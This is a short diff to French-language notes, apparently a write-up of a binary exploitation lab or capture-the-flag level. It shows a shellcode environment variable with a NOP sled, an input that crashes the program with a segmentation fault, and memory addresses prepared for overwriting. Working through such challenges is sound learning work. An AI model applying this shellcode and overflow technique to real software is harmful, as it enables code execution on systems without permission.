@@ -4,6 +4,13 @@ export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc
 
 On overwrite avec `fgets` dans le `main`
 
+```
+Input command: read123456789123456789123456   
+ Index: 
+Program received signal SIGSEGV, Segmentation fault.
+0x08048702 in read_number ()
+```
+
 Address of a shellcode : `0xffffd880`
 4294957184
 
@@ -26,4 +33,11 @@ Input command: store
  *** ERROR! ***
    This index is reserved for wil!
  *** ERROR! ***
- ```
+```
+
+0xffffd528
+
+\x28\xd5\xff\xff
+
+0xffffd5e8
+4294956520
